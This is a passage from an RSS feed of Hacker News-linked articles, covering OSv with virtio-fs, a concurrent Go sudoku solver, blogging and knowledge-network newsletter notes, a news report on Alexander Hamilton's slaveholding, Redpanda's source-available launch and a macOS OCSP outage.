<code>build/export</code> as the root file system. Any changes to this directory, directly
from the host will be visible in the guest without re-running the previous build
step.</p>

<h2 id="conclusion">Conclusion</h2>

<p>OSv has gained a prominent new feature, powered by virtio-fs and its QEMU
implementation. This allows efficient, lightweight and performant access to the
host’s file system, thanks to the native virtio transport, usage of the FUSE
protocol and the DAX window architecture. In turn, it enables use cases like
rapid unikernel reconfiguration.</p>

		<ul>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/storage/index.html">storage</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/virtio-fs/index.html">virtio-fs</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/unikernel/index.html">unikernel</a></li>
		
		<li><span></span><a href="https://www.qemu.org/blog/category/osv/index.html">OSv</a></li>
		
		</ul>
	</section>

		</div>
	</div></div>]]>
            </description>
            <link>https://www.qemu.org/2020/11/03/osv-virtio-fs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077279</guid>
            <pubDate>Fri, 13 Nov 2020 00:32:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Go: A Concurrent Sudoku Solver with Channels]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076752">thread link</a>) | @tosh
<br/>
November 12, 2020 | https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html | <a href="https://web.archive.org/web/*/https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Logical deduction puzzles like sudoku can often be modeled as consisting of a large number of similar and independent deductive steps, making them amenable to concurrency-based implementations. <a href="https://github.com/dkmccandless/sudokami">Sudokami</a> is a concurrent sudoku solver written in Go, a sketch of some of my ideas along these lines. Here’s how it works.</p>

<h3 id="just-go-things">Just Go Things</h3>

<p>The unit of concurrency in Go is the <a href="https://tour.golang.org/concurrency/1">goroutine</a>, which is an independently executing function with its own call stack—somewhat akin to a thread, except that goroutines are managed directly by the Go runtime itself. They’re cheap too: Sudokami creates more than a thousand of them, which barely taxes the runtime’s capabilities.</p>

<p>Goroutines communicate with each other via <a href="https://tour.golang.org/concurrency/2">channels</a>, on which one goroutine can send a value to be received by another. Channels can optionally be declared with a buffer size. Unbuffered channels enforce synchronicity by blocking a receive operation <code>&lt;-ch</code> if no incoming send operation <code>ch &lt;- v</code> is ready. This is the basis of Go’s synchronization functionality. On the other hand, buffered channels will only block sends if the buffer is already full, in a manner similar to Erlang’s <a href="https://en.wikipedia.org/wiki/Message_queue">mailboxes</a>. The <code>select</code> statement provides a way to maintain synchronicity when using multiple channel operations concurrently, or a single channel if the <code>select</code> contains a <code>default</code> clause. With a single channel outside of a <code>select</code>, however, the question of whether to buffer reduces to a tradeoff of enabling synchronization vs. avoiding blocking.</p>

<p>The exception to this is that receives on a channel will never block if that channel has already been closed. Calling <code>close(ch)</code> will cause subsequent receives on <code>ch</code> to succeed immediately with the zero value of <code>ch</code>’s type (after the contents of its buffer, if any, have been depleted). Many concurrency idioms in Go rely on this helpful feature, but here too there is an important caveat: whereas a receive on a closed channel always succeeds, a send on a closed channel causes a run-time panic. Idioms based around closing a channel are therefore generally restricted to communication designs in which the channel has at most one goroutine sending on it. (The implementation below relies instead on a pattern of each channel having many senders but only one receiver, so <code>close</code> is never called.)</p>

<h3 id="the-logic-of-sudoku">The Logic of Sudoku</h3>

<p>Sudoku is a logical constraint puzzle in which a 9×9 grid of “cells” must be filled with the digits 1-9 such that each digit is unique in its row and column, and also in its 3×3 “box” subdivision of the grid. It is thus a type of <a href="https://en.wikipedia.org/wiki/Exact_cover">exact cover problem</a>.</p>

<p>But the basic structural unit of a sudoku puzzle is not the cell, and the basic logical unit is not the digit. A cell can be in nine possible states, exactly one of which is shown to be true in the unique solution of a well-formed puzzle. Sudoku aficionados often use the term “pencil mark” to describe each of a cell’s possible solution states. Below, they are called <em>candidate inferences</em> or candidates. A sudoku puzzle has 9<sup>3</sup> of them—one for each unique combination of row, column, and digit—and they are all boolean in nature: each one can be true or false. This subtle reformulation of a digit in the range [1, 9] as a collection of nine mutually exclusive boolean values allows the structural encoding of the logic underlying the puzzle to be refined and generalized.</p>

<p>A cell, then, can be described as the intersection of one row and one column, and it contains nine candidates, each corresponding to a digit. Extending the pencil mark analogy with erasing all but one possible digit to determine the state of a cell, we may consider the instances of a particular digit in a particular row. Here too, there are nine mutually exclusive possibilities, one for each column. Likewise for all instances of a particular digit across any row in a particular column. In a sense, a sudoku puzzle is a 9×9×9 cube of these boolean candidate inferences, and solving the puzzle is the act of determining which 81 of them are true.</p>

<p>Call a complete set of mutually exclusive candidates a <em>group</em>. “The 6s in the top row” is a group. “The 8s in the bottom right box” is too. So is “all of the digits in the 2nd column of the 5th row”. Here is a grid with a few (non-intersecting) groups highlighted:</p>

<p><img src="https://dkmccandless.github.io/assets/sudoku-grid-groups.png" alt=""></p>

<p>Each group contains exactly nine candidates, and each candidate belongs to four groups:</p>
<ol>
  <li>its cell</li>
  <li>the instances of its digit in its row</li>
  <li>the instances of its digit in its column</li>
  <li>the instances of its digit in its 3×3 box</li>
</ol>

<p>Given this definition, the logic of solving a sudoku puzzle can be fully described in terms of groups and their candidates, without any direct reference to locations within the grid, rows, columns, boxes, cells, or even digits.</p>

<p>(NB: The term “group” is often used in popular sudoku literature to describe any row, column, or box in general; under this usage, the “One Rule” is more succinctly stated as “Each digit appears once in each group”, but that might be its only advantage—in particular, it’s worth noting that each of these “groups” can be in 9! possible states. The definition above is more logically elemental and also more useful to code with, as it exposes the helpful abstraction that a cell is the same kind of constraint domain as, for example, a row-digit intersection.)</p>

<h3 id="data-structures">Data Structures</h3>

<p>How might these entities function in code? A Group object could watch its Candidates to figure out when one Candidate must be true, and then advise its other Candidates accordingly. Each Candidate might attempt to determine whether it was true, and then communicate that information to its Groups. (In view of the bipartite nature of exact cover problems, we would hope to design a communication protocol obviating the need for Candidates to communicate directly with each other.) To an extent, the Candidate and Group types would have symmetrical definitions: each would need to receive from a channel on which its counterparts would send, and be able to send on some channels from which each of its counterparts would receive. So the their definitions might look something like this:</p>

<div><div><pre><code><span>type</span> <span>Candidate</span> <span>struct</span> <span>{</span>
	<span>ch</span> <span>chan</span> <span>bool</span>
	<span>groups</span> <span>[]</span><span>chan</span> <span>bool</span>
	<span>value</span> <span>bool</span>
<span>}</span>
</code></pre></div></div>
<div><div><pre><code><span>type</span> <span>Group</span> <span>struct</span> <span>{</span>
	<span>ch</span> <span>chan</span> <span>bool</span>
	<span>cans</span> <span>[]</span><span>chan</span> <span>bool</span>
<span>}</span>
</code></pre></div></div>
<p>Locally, each Group would additionally need to keep track of the information it receives. In practice, however, the number of <code>false</code>s is sufficient, and since this number is only used within the scope of the Group’s goroutine, a separate field for it is not necessary. On the other hand, in order to display the finished solution, each Candidate must also remember its truth value.</p>

<p>A few design goals:</p>
<ul>
  <li>First and foremost, deadlock must be provably impossible in the process of solving a well-formed puzzle with a unique solution.</li>
  <li>In the spirit of logical simplicity, Candidates and Groups should carry minimal information about their location within the puzzle, so that their function can be as decentralized as possible. The necessary relationships are encoded in the set of channel references each possesses. Beyond this, the logical symmetry of the puzzle does not strictly require any positional information to be considered, as there are no “special” rows, columns, or digits.</li>
  <li>It would be nice to limit the number of values that would need to be sent. Specifically, is it ever necessary for a Candidate to send more than one value to each of its Groups? Can a Group function properly sending only one identical value to each of its Candidates?</li>
  <li>For the sake of readability and reasonability, it would also be nice to limit the number of channels involved. Will one per Candidate and one per Group work?</li>
</ul>

<p>It seems that an ideal design solution would have one channel for each Candidate and one for each Group, on which they listen for information sent by their counterparts. Each Candidate should send to each of its Groups exactly once in the course of the solution process, without needing to indicate its location in the puzzle. Each Group should send to each of its Candidates exactly once, without needing to know their location. Since a Group receives all of its Candidates’ information on a single channel, this last criterion necessitates that it send the same boolean value to all of its Candidates.</p>

<p>It turns out that there is a logically consistent and relatively simple way to do all of this.</p>

<h3 id="communication-protocol">Communication Protocol</h3>

<p>In designing the protocol by which Candidates and Groups interact, we make use of the fact that, in a properly formed sudoku puzzle with a unique solution, the truth value of a Candidate does not depend on the order of the deductions that imply its truth or falsity. For a hypothetical protocol in which each boolean value sent to a Candidate indicated that Candidate’s truth value, it would receive the same information from each of its Groups, in some order or other. Therefore, it would only be necessary for each Candidate to pay attention to the first value it received. The above constraint can be relaxed accordingly: a Group may only send a value to a Candidate if that value indicates whether the Candidate is true, <em>unless the Group knows that the Candidate has already received a value</em>. Specifically, it’s fine for a Group to send <code>false</code> to <em>all</em> of its Candidates after it has received a value of <code>true</code> from one of them, since it will receive <code>true</code> exactly once in a well-formed puzzle, and the Candidate that sent it already knows that it is true (because it received this information first from another source). On the other hand, a Group must not send <code>true</code> until it has received eight <code>false</code>s.</p>

<p>These conditions strongly suggest the use of buffered channels. While concurrency is one of Sudokami’s central design goals, there is no need for Groups and Candidates to actually synchronize with each other. On the other hand, since the number of values that will be sent on each channel is known in advance, buffering to this capacity ensures that sends will never block, even if not all of those values are consumed.</p>

<p>The protocol itself is …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html">https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html</a></em></p>]]>
            </description>
            <link>https://dkmccandless.github.io/2020/10/09/a-concurrent-sudoku-solver-with-channels.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076752</guid>
            <pubDate>Thu, 12 Nov 2020 23:29:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lessons learned from blogging for 10 years]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076727">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/ | <a href="https://web.archive.org/web/*/https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-922">
				<!-- <a href="https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              																			<p>								Wisdom								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>Why Blog</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="287" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wisdom.gif" alt="" loading="lazy"></p><div>

																					<div>
								<p><a href="https://giphy.com/gifs/signal-blogging-personal-brand-yH7DhArkFamCfoNTik" target="_blank">
									[Image source: Giphy]								</a></p><h5>
									<a href="https://andrewchen.co/professional-blogging/" target="_blank">
										10 years of professional blogging – what I’ve learned									</a>
									 &nbsp;by Andrew Chen									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>I keep seeing “bat signal” as a reference to sharing your aspirations, ideas, and interests online. Essentially the higher, brighter, and attracting your bat signal is, the more doors unlock for you. Blogging is one form of getting your bat signal going.</span></li>
<li><span>Andrew on blogging: “It’s awesome, but insanely hard to get started. Of course, everyone knows the mechanics of setting up a blog – but the hard part is finding your voice, figuring out topics that are interesting for other folks to read, and building a long-term habit.”</span></li>
<li><span>“Writing is the most scalable professional networking activity – stay home, don’t go to events/conferences, and just put ideas down” — Andrew Chen</span></li>
<li><span>Blog titles are one of the most important aspects of your blog, but should be created last. Your blog titles should be able to pass the naked share test. Meaning it should be able to stand as an opinion on its own.</span></li>
<li><span>“Thinking of yourself as a journalist that’s covering interesting ideas, trends, products, and everything that’s happening around you leads to much better/stronger content.” — Andrew Chen</span></li>
<li><span>“The important part is just to start giving out your knowledge and ideas – and over time, to build that into a platform for other activities.” — Andrew Chen</span></li>
<li><span>“Building your network, your audience, and your ideas will be something you’ll want to do over your entire career.” — Andrew Chen</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>Andrew’s last point is the hardest hitting for me and it brings me back to the bat signal. Your bat signal strengthens throughout your career. As with all valuable things, your bat signal and career aren’t built overnight, only [gr_dua_y]…👣👣 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!-- </a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/why-blogging-is-better-than-any-audience-building-mechanism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076727</guid>
            <pubDate>Thu, 12 Nov 2020 23:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Popular view of Alexander Hamilton as key U.S. slavery abolitionist falls short]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076594">thread link</a>) | @AndrewBissell
<br/>
November 12, 2020 | https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Alexander Hamilton is almost universally depicted as an abolitionist in popular modern works, from Ron Chernow's 2004 biography, Hamilton, to Lin-Manuel Miranda's Tony Award-winning show, Hamilton: An American Musical. But after poring over ledgers and correspondence of Hamilton and his wife, a new research paper concluded that image falls short.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5798181.1605109529!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/new-york-daily-life.jpg"></p></div><figcaption>A statue of Alexander Hamilton stands in New York's Central Park on Tuesday. Hamilton is almost universally depicted as an abolitionist in popular modern works, including Miranda's Tony Award-winning Hamilton musical. But after poring over ledgers and correspondence of Hamilton and his wife, Jessie Serfilippi concluded that image falls short.<!-- --> <!-- -->(Frank Franklin II/The Associated Press)</figcaption></figure><p><span><p>A new research paper takes a swipe at the popular image of Alexander Hamilton as the U.S. abolitionist founding father, citing evidence he was a slave trader and owner himself.</p>  <p>"Not only did Alexander Hamilton enslave people, but his involvement in the institution of slavery was essential to his identity, both personally and professionally," Jessie Serfilippi, an interpreter at a New York state historic site, wrote in a paper published last month.</p>  <p>Hamilton is almost universally depicted as an abolitionist in popular modern works, from Ron Chernow's 2004 biography, <em>Hamilton</em>,&nbsp;to Lin-Manuel Miranda's Tony Award-winning show, <em>Hamilton: An American Musical.</em></p>  <p>But after poring over ledgers and correspondence of Hamilton and his wife, Eliza Schuyler Hamilton, Serfilippi, who works at the Schuyler Mansion State Historic Site in Albany, N.Y., concluded that image falls short.</p>  <p>"It is vital that the myth of Hamilton as 'the Abolitionist Founding Father'&nbsp;end," Serfilippi writes in the paper&nbsp;entitled&nbsp;As Odious and Immoral a Thing: Alexander Hamilton's Hidden History as an Enslaver.&nbsp;Her research was published on the New York state park system website.</p>  <p>The paper adds to a concern voiced by many academics that the fictitious Hamilton of the musical, who attacks slavery in a rap battle with Thomas Jefferson, is just that: fictitious.</p>  <p>"Fascinating article," tweeted Harvard Law professor and historian Annette Gordon-Reed, who has criticized the Broadway show in the past. "Reminds of the ubiquitous nature of slavery in the colonial period and the early American republic. Alexander Hamilton as an enslaver broadens the discussion."</p>  <p>Chernow called the paper a "terrific research job that broadens our sense of Hamilton's involvement in slavery in a number of ways." But he questioned her claim that slavery was "essential to his identity" and said Serfilippi omitted information that would contradict her conclusions.</p>    <p>For example, Chernow noted Hamilton's work with the Manumission Society to abolish slavery in New York and defend free Blacks when slave masters from out of state tried to snatch them off New York streets.</p>  <p>"Had she tried to reconcile these important new findings with a full and fair statement of Hamilton's anti-slavery activities, we would have gotten a large and complex view of the man and her paper would have been far more persuasive," Chernow said via email.</p>  <p>Miranda declined to comment through his publicist. In past interviews, he's said he welcomes discussion of both Hamilton's role in slavery and criticism of his show's handling of that part of his life.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/film-hamilton.jpg 300w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/film-hamilton.jpg 460w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/film-hamilton.jpg 620w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/film-hamilton.jpg 780w,https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/film-hamilton.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5450175.1605109224!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/film-hamilton.jpg"></p></div><figcaption>In this June 12, 2016, file photo, Lin-Manuel Miranda and the cast of Hamilton perform at the Tony Awards in New York.<!-- --> <!-- -->(Evan Agostini/Invision/AP)</figcaption></figure></span></p>  <h2>'Truth revealed in Hamilton's cash books and letters'</h2>  <p>When Hamilton married into the powerful Schuyler family in 1780, slavery was common among New York state's elite. More than 40 people were enslaved at the Schuyler family's Albany mansion and another estate over the years. The historic site has done extensive research into the family's so-called servants&nbsp;and incorporates it into its tours.</p>  <p>Albany Mayor Kathy Sheehan ordered the removal of the Maj. Gen. Philip Schuyler statue earlier this year in part because he was "reportedly the largest owner of enslaved people in Albany during his time," according to the mayor's office.</p>  <p>Serfilippi challenges the often repeated claim that Hamilton's exposure to the brutalities of slavery during his childhood on St. Croix instilled a hatred of slavery. She said&nbsp;"no primary sources have been found to corroborate" that.</p>  <p>Biographers have noted that Hamilton helped legal clients and family members buy and sell slaves, but they've been less clear on whether he enslaved people himself. Serfilippi said notations in his cash books and in family letters clearly show he did.</p>  <p>For example, Hamilton's cash books record a payment of $250 US to Philip Schuyler in 1796 for "2 Negro servants purchased by him for me." Another entry records receiving $100 US for lending a "Negro boy" to another person. And Serfilippi notes an inventory made of Hamilton's property to settle his affairs after his death in the duel with Aaron Burr in 1804 includes "servants" valued at 400 pounds.</p>  <p>Joanne Freeman, Yale history professor and editor of the Library of America edition of Hamilton's writings, said via email that, "It's fitting that we are reckoning with Hamilton's status as an enslaver at a time that is driving home how vital it is for white Americans to reckon — seriously reckon — with the structural legacies of slavery in America."</p>  <p>Serfilippi said her research interest goes beyond debunking myths about Hamilton.</p>  <p>"The truth revealed in Hamilton's cash books and letters must be acknowledged in order to honour the people he enslaved," she writes. "Through understanding and accepting Hamilton's status as an enslaver, the stories of the people he enslaved can finally take their rightful place in history."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/entertainment/alexander-hamilton-slavery-research-paper-1.5798143</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076594</guid>
            <pubDate>Thu, 12 Nov 2020 23:14:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Knowledge Economy: The Rise of Community-Curated Knowledge Networks]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25076142">thread link</a>) | @davefreiburger
<br/>
November 12, 2020 | https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/ | <a href="https://web.archive.org/web/*/https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
			<article id="post-920">
				<!--<a href="https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/">-->
					<div>
						<div>
	              			<!-- category colored coded display and hide takeaways php -->
	              											<p>																Wealth								</p><!-- end cat-wrap -->
						<p><span>&nbsp; •&nbsp; </span>
						<span>The Knowledge Economy</span>
						<span> &nbsp;•&nbsp; </span>
						<span>
							November 12, 2020						</span>

						<img width="640" height="337" src="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png" alt="" loading="lazy" srcset="https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1024x539.png 1024w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-300x158.png 300w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-768x404.png 768w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth-1536x808.png 1536w, https://gradually.co/wp-content/uploads/2020/11/GD26-Wealth.png 1900w" sizes="(max-width: 640px) 100vw, 640px"></p><div>

																					<div>
								<p><a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
									[Image source: Check your Pulse #55 / Sari Azout]								</a></p><h5>
									<a href="https://sariazout.substack.com/p/check-your-pulse-55" target="_blank">
										The rise of community-curated knowledge networks									</a>
									 &nbsp;by Sari Azout / Check your Pulse									<br>
								</h5>
								
								<p>
									Takeaways
								</p>
								<div>
									<ul>
<li><span>This piece of content is all about the future of/how to think about online communities at the intersection of content curation and knowledge management&nbsp; 🤯 … *strap in*</span></li>
<li><span>“At least 2.5 quintillion bytes of information are produced every day, which is approximately what was produced during all of 2002. While this presents enormous opportunities, our brains are not equipped to deal with this abundance.” — Sari Azout</span></li>
<li><span>“We seem to have forgotten that the goal is not to consume more information. The goal is to think better, so we can achieve our goals.” — Sari Azout</span></li>
<li><span>“There’s a whole economy around knowledge organization available for the taking…&nbsp;</span>
<ul>
<li><span>Three intersecting problems remain unsolved:&nbsp;</span></li>
</ul>
</li>
</ul>
<ol>
<li>
<ol>
<li>
<ol>
<li><span>Our feed-based information architecture is obsessed with the present.</span></li>
<li><span>We consume information recreationally, not as a way to achieve our goals.</span></li>
<li><span>Curation has been too focused on the information and not enough on architecture; how we collect, store, augment, and utilize what’s already in our minds.” — Sari Azout</span></li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>
<li><span>“Without an information architecture that supports a longer shelf life for content, we will continue to accumulate mental and behavioral debt.” — Sari Azout</span></li>
<li><span>“What’s amazing is how chronological feeds — essentially accidental experiments of digital architecture — have rewired our brains. In the feed, everything is fleeting. This design property means you’re either always on and connected, or you’re off and wondering if you’re missing something important.” — Sari Azout</span></li>
<li><span>“In short, the architecture of digital platforms has made us obsessive documenters and consumers of the present, yet largely indifferent to the archives we create.” — Sari Azout</span></li>
<li><span>“Blending curation and community to inhabit a space I call: new media. On the community side, we’re witnessing a shift towards a post-social media era defined by niche, gated communities of interest and purpose.” — Sari Azout</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>You might be wondering why I included this in the wealthy section. It’s not a bad question! After reading this piece, I immediately thought about the amount of opportunities the “online communities at the intersection of content curation and knowledge management” space presents…I highly suggest following Sari Azout [</span><a href="https://twitter.com/sariazout"><b><i>here</i></b></a><span>] as she’s going to be announcing what she’s been working on soon 👀 </span></p>
								<p>
								<span>Share</span> (if you're an OG)  &nbsp;  <span></span><span><span>
									</span><span>


							</span></span></p></div><!-- end newsletter wrap content -->
													
						</div><!-- end newsletter wrap content -->
					</div><!-- end newsletter wrap -->
				<!--</a>-->
			</div></article><!-- #post-## -->
		</div></div>]]>
            </description>
            <link>https://gradually.co/community-curated-knowledge-networks-and-the-rise-of-the-knowledge-economy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25076142</guid>
            <pubDate>Thu, 12 Nov 2020 22:35:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RedPanda: 10x Faster Kafka]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25075739">thread link</a>) | @sorenbs
<br/>
November 12, 2020 | https://vectorized.io/open-source/ | <a href="https://web.archive.org/web/*/https://vectorized.io/open-source/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><img src="https://vectorized.io/5fec7d1698c66e160017f1ad37732a09/redpanda-bsl.svg" alt="always"></p></div>
<p>We are building a real-time streaming engine for modern applications - from the enterprise to
the solo dev prototyping a react application on her laptop. We go beyond the Kafka protocol,
into the future of streaming with inline WASM transforms and geo-replicated hierarchical storage.
A new platform that scales with you from the smallest projects to petabytes of data distributed across the globe. </p>
<h2 id="Background">Background<a href="#Background" aria-label="Background permalink"></a></h2>
<p>As easy to run as <code>nginx</code>. No dependencies. Ability to flush to disk with <code>acks=-1</code>.
Leverage a huge and active ecosystem. It must be fast, really fast. With this wishlist
in mind, I wrote the first line of code of what eventually became <code>redpanda</code>. It was January 7th,
2019 and I was still living in Miami before relocating to San Francisco. I hadn’t had as much
fun hacking on anything since the initial prototype of my previous project &amp; company <a href="http://www.concord.io/" target="_self" rel="nofollow">concord.io</a>
and… it was equally all-consuming.</p>
<p>Here we are today, 22 months later. A team one dreams to be part of and a product we feel proud to
share with you. Ready to be put through the paces in even more ways that we could have anticipated,
whether embedding Redpanda in a security appliance, or using it as part of your new NodeJS application
because it’s so simple to use. Whoever you are, welcome! We are excited to have you in our community.</p>
<h2 id="Legal">Legal<a href="#Legal" aria-label="Legal permalink"></a></h2>
<p>The project is released under the Source Available License - BSL - similar to what our friends at CockroachDB have done.
We try to make this clear in the license, but worth reiterating here. Our intention is to deter cloud providers from offering our work as a service.
For 99.999% of you, restrictions will not apply - welcome to our community!</p>
<p>There will be enterprise, pay-only features that will be obvious, since to turn them on you have to
edit the <code>enterprise</code> section of the configuration. </p>
<h2 id="Getting-Started">Getting Started<a href="#Getting-Started" aria-label="Getting Started permalink"></a></h2>
<p>The simplest thing you can do is run in Docker. Follow the <a href="https://vectorized.io/rpk-container">tutorial here</a>.
But for the truly impatient, here is the executive summary: </p>
<div data-language="text"><pre><code>$ rpk container start -n 3
NODE ID  ADDRESS          CONFIG                                             
  0        172.24.1.2:9092  /home/david/.rpk/cluster/node-0/conf/redpanda.yaml  
  1        172.24.1.4:9092  /home/david/.rpk/cluster/node-1/conf/redpanda.yaml  
  2        172.24.1.3:9092  /home/david/.rpk/cluster/node-2/conf/redpanda.yaml  

Cluster started! You may use 'rpk api' to interact with the cluster. E.g:

rpk api status</code></pre></div>
<p>It says we can check our cluster with <code>rpk api status</code> Let’s try that!</p>
<div data-language="text"><pre><code>$ rpk api status
  Redpanda Cluster Status                   
                                            
  0 (172.24.1.2:9092)      (No partitions)  
                                            
  1 (172.24.1.3:9092)      (No partitions)  
                                            
  2 (172.24.1.4:9092)      (No partitions)</code></pre></div>
<p>All of the <code>rpk api</code> subcommands will detect the local cluster and use its addresses, so you don’t have to configure anything or keep track of IPs and ports.</p>
<p>For example, you can run <code>rpk api topic create</code> and it will work!</p>
<div data-language="text"><pre><code>$ rpk api topic create -p 6 -r 3 new-topic
Created topic 'new-topic'. Partitions: 6, replicas: 3, cleanup policy: 'delete'</code></pre></div>
<h2 id="Thank-you">Thank you<a href="#Thank-you" aria-label="Thank you permalink"></a></h2>
<p>This decision comes after almost a year of thinking and mentorship with a very large group of experts, OSS enthusiasts,
lawyers and quiet time thinking. Special thanks to Peter Mattis from CockroachDB for sharing his experience with BSL
which ultimately made us feel comfortable with our decision to also choose BSL. Adam Jacob for sharing his experiences with Chef,
his never-ending expertise around licensing and for taking the time to walk me through business models with me.
Thanks to Ajay Kulkarni from TimescaleDB for sharing his wealth of knowledge and experience building a community.
Thanks to Megan Gill at MongoDB for helping me better understand OSS in general, and to Gaurav Gupta now at LSVP
for helping me understand Elastic a bit better and how the OSS+Source Available has matured in the last decade.
We are better because of your advice, I am forever thankful.</p></section></div>]]>
            </description>
            <link>https://vectorized.io/open-source/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075739</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New macOS update slows down older versions, literally]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25075736">thread link</a>) | @dewey
<br/>
November 12, 2020 | https://annoying.technology/posts/0f0325b37e2292f8/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/0f0325b37e2292f8/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/cbd3c98a693fe88041e8037587459629b3eef4a3/7c846/media/wellthatsjustgreat.png"></p><p>If you are running macOS you also run a service called <a href="https://www.howtogeek.com/331343/what-is-trustd-and-why-is-it-running-on-my-mac/">trustd</a> which is <a href="https://mjtsai.com/blog/2020/05/22/macos-10-15-slow-by-design/">verifying</a> the signature of installed apps. This service is calling <a href="http://ocsp.apple.com/">ocsp.apple.com</a> which is currently down, possibly related to the (also not accessible) software update service.</p><p>Result: Apps take minutes to start, your Mac grinds to a halt with no indication what’s going on.</p><p>Workarounds proposed <a href="https://twitter.com/lapcatsoftware/status/1326990296412991489">on Twitter</a> include pointing ocsp.apple.com to localhost.</p><p>It just works!</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/0f0325b37e2292f8/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25075736</guid>
            <pubDate>Thu, 12 Nov 2020 22:04:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure destination-passing style in Linear Haskell]]>
            </title>
            <description>
<![CDATA[
